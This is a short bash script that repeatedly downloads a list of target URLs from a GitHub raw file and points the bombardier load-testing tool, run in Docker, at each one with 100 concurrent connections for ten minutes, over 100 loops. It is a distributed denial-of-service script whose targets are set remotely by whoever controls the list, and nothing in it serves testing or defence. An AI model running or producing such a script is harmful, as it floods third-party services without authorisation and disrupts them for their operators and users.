#!/bin/bash

for i in {1..100};
do 

    FILENAME="list.txt"
    wget -O  $FILENAME https://raw.githubusercontent.com/lavals/safeua/main/list.txt
    LINES=$(cat $FILENAME)
    for LINE in $LINES
        do
            docker run -it --rm alpine/bombardier -c 100 -d 600s -t 1s "$LINE"
        done
done